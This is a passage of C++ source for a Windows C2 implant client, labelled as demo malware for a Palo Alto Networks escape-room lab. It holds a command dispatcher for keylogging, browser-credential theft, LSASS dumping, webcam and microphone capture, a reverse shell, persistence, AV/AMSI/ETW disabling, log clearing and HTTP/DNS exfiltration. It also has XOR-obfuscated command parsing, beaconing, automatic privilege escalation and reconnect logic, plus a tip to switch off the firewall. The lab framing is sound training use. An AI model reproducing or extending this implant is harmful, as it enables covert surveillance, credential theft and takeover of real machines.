                logActivity("CLIENT_DEBUG", "CMD_SYSINFO", "Executing system info collection");
                executeSystemInfo();
                break;
                
            case CMD_PROCESS_LIST:
                executeProcessList();
                break;
                
            case CMD_NETWORK_CONFIG:
                executeNetworkConfig();
                break;
                
            case CMD_USER_ENUM:
                executeUserEnum();
                break;
                
            case CMD_DOMAIN_INFO:
                executeDomainInfo();
                break;
                
            case CMD_SOFTWARE_ENUM:
                executeSoftwareEnum();
                break;
                
            case CMD_PROCESS_HOLLOW:
                executeProcessHollow();
                break;
                
            case CMD_PORT_SCAN:
                executePortScan();
                break;
                
            case CMD_SCREENSHOT:
                logActivity("CLIENT_DEBUG", "CMD_SCREENSHOT", "Executing screenshot capture");
                executeScreenshot();
                break;
                
            case CMD_KEYLOG_START:
                logActivity("CLIENT_DEBUG", "CMD_KEYLOG_START", "Starting keylogger");
                executeKeyloggerStart();
                break;
                
            case CMD_KEYLOG_DUMP:
                logActivity("CLIENT_DEBUG", "CMD_KEYLOG_DUMP", "Dumping keylogger data");
                executeKeyloggerDump();
                break;
                
            case CMD_CLIPBOARD:
                executeClipboard();
                break;
                
            case CMD_BROWSER_CREDS:
                executeBrowserCredentials();
                break;
                
            case CMD_LSASS_DUMP:
                executeLsassDump();
                break;
                
            case CMD_FILE_SEARCH:
                executeFileSearch("*.doc* *.xls* *.pdf *.txt");
                break;
                
            case CMD_WEBCAM_CAPTURE:
                executeWebcamCapture();
                break;
                
            case CMD_MICROPHONE_RECORD:
                executeMicrophoneRecord();
                break;
                
            case CMD_SCREEN_RECORD:
                executeScreenRecord();
                break;
                
            case CMD_SHELL_EXEC:
                executeShellCommand(params);
                break;
                
            case CMD_POWERSHELL:
                executePowerShell(params);
                break;
                
            case CMD_REVERSE_SHELL:
                executeReverseShell();
                break;
                
            case CMD_REGISTRY_PERSIST:
                executeRegistryPersistence();
                break;
                
            case CMD_SCHEDULED_TASK:
                executeScheduledTask();
                break;
                
            case CMD_STARTUP_FOLDER:
                executeStartupFolder();
                break;
                
            case CMD_DISABLE_AV:
                executeDisableAV();
                break;
                
            case CMD_CLEAR_LOGS:
                executeClearLogs();
                break;
                
            case CMD_UAC_BYPASS:
                executeUACBypass();
                break;
                
            case CMD_TOKEN_STEAL:
                executeTokenSteal();
                break;
                
            case CMD_AMSI_BYPASS:
                executeAMSIBypass();
                break;
                
            case CMD_ETW_DISABLE:
                executeETWDisable();
                break;
                
            case CMD_EXFIL_HTTP:
                executeExfilData("HTTP", params);
                break;
                
            case CMD_EXFIL_DNS:
                executeExfilData("DNS", params);
                break;
                
            default:
                sendResponse("UNSUPPORTED:COMMAND:" + std::to_string(cmd));
                break;
        }
    }
    
    void processServerCommand(const char* buffer, int size) {
        // Debug: Log command received
        logActivity("CLIENT_DEBUG", "COMMAND_RECEIVED", "Processing command - Size: " + std::to_string(size) + " bytes");
        
        // Try to parse as C2Packet first
        if (size >= sizeof(C2Packet)) {
            logActivity("CLIENT_DEBUG", "PACKET_PARSE", "Attempting to parse as C2Packet (size >= " + std::to_string(sizeof(C2Packet)) + ")");
            
            std::string decryptedPacket = xorEncrypt(std::string(buffer, sizeof(C2Packet)), "PaloAltoEscapeRoom");
            C2Packet* packet = (C2Packet*)decryptedPacket.c_str();
            
            logActivity("CLIENT_DEBUG", "PACKET_SIGNATURE", "Packet signature: 0x" + std::to_string(packet->signature) + " (expected: 0xC2E5CA9E)");
            
            if (packet->signature == 0xC2E5CA9E) {
                logActivity("CLIENT_DEBUG", "PACKET_VALID", "Valid C2 packet found - Command ID: " + std::to_string(packet->commandId));
                processCommand((CommandType)packet->commandId);
                return;
            } else {
                logActivity("CLIENT_DEBUG", "PACKET_INVALID", "Invalid packet signature, trying text command parsing");
            }
        } else {
            logActivity("CLIENT_DEBUG", "PACKET_TOO_SMALL", "Buffer too small for C2Packet, trying text command parsing");
        }
        
        // Otherwise, parse as text command
        std::string decrypted = xorEncrypt(std::string(buffer, size), "PaloAltoEscapeRoom");
        
        // Debug: Log decrypted command (before cleanup)
        std::string preview = decrypted.length() > 100 ? decrypted.substr(0, 100) + "..." : decrypted;
        logActivity("CLIENT_DEBUG", "TEXT_COMMAND_DECRYPTED", "Raw command: '" + preview + "' (Length: " + std::to_string(decrypted.length()) + ")");
        
        // Remove newlines
        decrypted.erase(std::remove(decrypted.begin(), decrypted.end(), '\n'), decrypted.end());
        
        // Debug: Log cleaned command
        std::string cleanPreview = decrypted.length() > 100 ? decrypted.substr(0, 100) + "..." : decrypted;
        logActivity("CLIENT_DEBUG", "TEXT_COMMAND_CLEANED", "Cleaned command: '" + cleanPreview + "'");
        
        // Parse different command formats
        if (decrypted.find("SHELL:EXEC:") == 0) {
            logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Shell execution command detected");
            std::string cmd = decrypted.substr(11);
            executeShellCommand(cmd);
        } else if (decrypted.find("SHELL:INIT:") == 0) {
            sendResponse("SHELL:READY");
        } else if (decrypted.find("POWERSHELL:EXEC:") == 0) {
            std::string cmd = decrypted.substr(16);
            executePowerShell(cmd);
        } else if (decrypted.find("KEYLOG:") == 0) {
            logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Keylogger command detected: " + decrypted);
            if (decrypted == "KEYLOG:START:HOOK") {
                logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Starting keylogger hook");
                executeKeyloggerStart();
            } else if (decrypted == "KEYLOG:DUMP") {
                logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Dumping keylogger data");
                executeKeyloggerDump();
            } else {
                logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Unrecognized keylog command: " + decrypted);
            }
        } else if (decrypted.find("CAMPAIGN:") == 0) {
            std::string campaign = decrypted.substr(9);
            sendResponse("CAMPAIGN:ACK:" + campaign);
        } else if (decrypted.find("MIMIKATZ:") == 0) {
            std::string mimCmd = decrypted.substr(9);
            sendResponse("MIMIKATZ:OUTPUT:" + mimCmd + ":Simulated output");
        } else if (decrypted.find("WEBCAM:") == 0) {
            if (decrypted.find("WEBCAM:INIT:") == 0) {
                sendResponse("WEBCAM:INITIALIZED");
            } else if (decrypted.find("WEBCAM:CAPTURE:") == 0) {
                executeWebcamCapture();
            } else if (decrypted == "WEBCAM:RECORD:START") {
                sendResponse("WEBCAM:RECORDING:STARTED");
            } else if (decrypted == "WEBCAM:RECORD:STOP") {
                sendResponse("WEBCAM:RECORDING:STOPPED");
            }
        } else if (decrypted.find("MIC:") == 0) {
            if (decrypted.find("MIC:INIT:") == 0) {
                sendResponse("MIC:INITIALIZED");
            } else if (decrypted.find("MIC:RECORD:START") == 0) {
                executeMicrophoneRecord();
            } else if (decrypted == "MIC:RECORD:STOP") {
                sendResponse("MIC:RECORDING:STOPPED");
            }
        } else if (decrypted.find("SCREEN:") == 0) {
            logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Screen command detected: " + decrypted);
            if (decrypted.find("SCREEN:INIT:") == 0) {
                logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen initialization");
                sendResponse("SCREEN:INITIALIZED");
            } else if (decrypted.find("SCREEN:CAPTURE:") == 0) {
                logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen capture requested");
                executeScreenshot();
            } else if (decrypted.find("SCREEN:RECORD:START") == 0) {
                logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen recording start");
                executeScreenRecord();
            } else if (decrypted == "SCREEN:RECORD:STOP") {
                logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Screen recording stop");
                sendResponse("SCREEN:RECORDING:STOPPED");
            } else {
                logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Unrecognized screen command: " + decrypted);
            }
        } else {
            logActivity("CLIENT_DEBUG", "COMMAND_UNRECOGNIZED", "Unrecognized command: " + decrypted);
        }
    }
    
    void run() {
        // Set socket to non-blocking mode for better responsiveness
        u_long mode = 1;
        ioctlsocket(serverSocket, FIONBIO, &mode);
        
        auto lastBeacon = std::chrono::steady_clock::now();
        
        while (connected) {
            // Check for incoming commands
            char buffer[CLIENT_BUFFER_SIZE];
            int bytes = recv(serverSocket, buffer, sizeof(buffer), 0);
            
            if (bytes > 0) {
                logActivity("CLIENT_DEBUG", "COMMAND_RECEIVED_MAIN", "Received " + std::to_string(bytes) + " bytes from server - processing...");
                processServerCommand(buffer, bytes);
            } else if (bytes == 0) {
                logActivity("CLIENT_DEBUG", "CONNECTION_CLOSED", "Server closed connection");
                // Server disconnected
                connected = false;
                break;
            } else {
                int error = WSAGetLastError();
                if (error != WSAEWOULDBLOCK) {
                    // Real error occurred
                    connected = false;
                    break;
                }
            }
            
            // Send periodic beacon
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastBeacon).count() >= CLIENT_BEACON_INTERVAL) {
                sendResponse("BEACON:KEEPALIVE:" + clientId);
                lastBeacon = now;
            }
            
            Sleep(100);
        }
    }
    
    void start() {
        std::cout << "[*] C2 Client starting..." << std::endl;
        std::cout << "[*] Machine: " << hostname << " (" << machineGuid << ")" << std::endl;
        std::cout << "[*] User: " << username << " (" << (isElevated ? "Admin" : "User") << ")" << std::endl;
        
        // Display additional connection info
        std::cout << "[*] Target server: " << serverIP << std::endl;
        std::cout << "[*] Primary port: " << serverPort << std::endl;
        std::cout << "[*] Backup port: 8443" << std::endl;
        
        // Check if we should attempt privilege escalation
        if (!isElevated) {
            std::cout << "[!] Running without admin privileges. Some features may be limited." << std::endl;
            
            if (autoElevate) {
                std::cout << "[*] Attempting automatic privilege escalation..." << std::endl;
                
                if (AttemptPrivilegeEscalation()) {
                    std::cout << "[+] Privilege escalation successful! Restarting with elevated privileges..." << std::endl;
                    
                    // Restart with elevated privileges
                    char exePath[MAX_PATH];
                    GetModuleFileNameA(NULL, exePath, MAX_PATH);
                    
                    SHELLEXECUTEINFOA sei = { sizeof(sei) };
                    sei.lpVerb = "runas";
                    sei.lpFile = exePath;
                    sei.lpParameters = (std::string("client ") + serverIP + " " + std::to_string(serverPort)).c_str();
                    sei.hwnd = NULL;
                    sei.nShow = SW_NORMAL;
                    
                    if (ShellExecuteExA(&sei)) {
                        std::cout << "[+] Spawned elevated client. Exiting current instance..." << std::endl;
                        exit(0);
                    }
                } else {
                    std::cout << "[-] Automatic privilege escalation failed. Continuing with limited privileges." << std::endl;
                    std::cout << "[*] Admin functions may not work properly." << std::endl;
                }
            } else {
                std::cout << "[*] Auto-elevation disabled. Admin functions may not work properly." << std::endl;
                std::cout << "[*] Use UAC bypass command from server to attempt elevation." << std::endl;
            }
        } else {
            std::cout << "[+] Running with administrative privileges - all features available!" << std::endl;
        }
        
        while (true) {
            if (!connected) {
                std::cout << "[*] Attempting to connect to C2 server at " << serverIP << ":" << serverPort << std::endl;
                
                bool connectionSuccess = false;
                int originalPort = serverPort;
                
                // Try primary port first
                if (connectToServer()) {
                    connectionSuccess = true;
                } else if (serverPort == 443) {
                    // Try backup port if primary port failed
                    std::cout << "[*] Primary port failed, trying backup port 8443..." << std::endl;
                    serverPort = 8443;
                    if (connectToServer()) {
                        connectionSuccess = true;
                        std::cout << "[+] Connected on backup port 8443" << std::endl;
                    } else {
                        serverPort = originalPort; // Restore original port for next attempt
                    }
                }
                
                if (connectionSuccess) {
                    std::cout << "[+] Connected to C2 server" << std::endl;
                    std::cout << "[+] Client ID: " << clientId << std::endl;
                    run();
                    std::cout << "[-] Disconnected from C2 server" << std::endl;
                } else {
                    std::cout << "[-] Failed to connect on both ports, retrying in " << (CLIENT_RETRY_DELAY/1000) << " seconds..." << std::endl;
                    std::cout << "[!] Troubleshooting tips:" << std::endl;
                    std::cout << "    - Check if server is running: escapebox.exe server" << std::endl;
                    std::cout << "    - Check Windows Firewall settings" << std::endl;
                    std::cout << "    - Try: netsh advapi firewall set allprofiles state off (requires admin)" << std::endl;
                    std::cout << "    - Verify network connectivity to " << serverIP << std::endl;
                }
                
                if (serverSocket != INVALID_SOCKET) {
                    closesocket(serverSocket);
                    serverSocket = INVALID_SOCKET;
                }
            }
            
            // Wait before reconnecting
            Sleep(CLIENT_RETRY_DELAY);
        }
    }
};

// Main client runner function
void runClient(const std::string& serverIP, int serverPort, bool autoElevate) {
    std::cout << "\n";
    std::cout << "====================================================\n";
    std::cout << "     C2 CLIENT - PALO ALTO NETWORKS ESCAPE ROOM    \n";
    std::cout << "            DEMO MALWARE - LAB USE ONLY            \n";
    std::cout << "====================================================\n";
    std::cout << "\n";
    
    C2Client client(serverIP, serverPort, autoElevate);
    client.start();
}
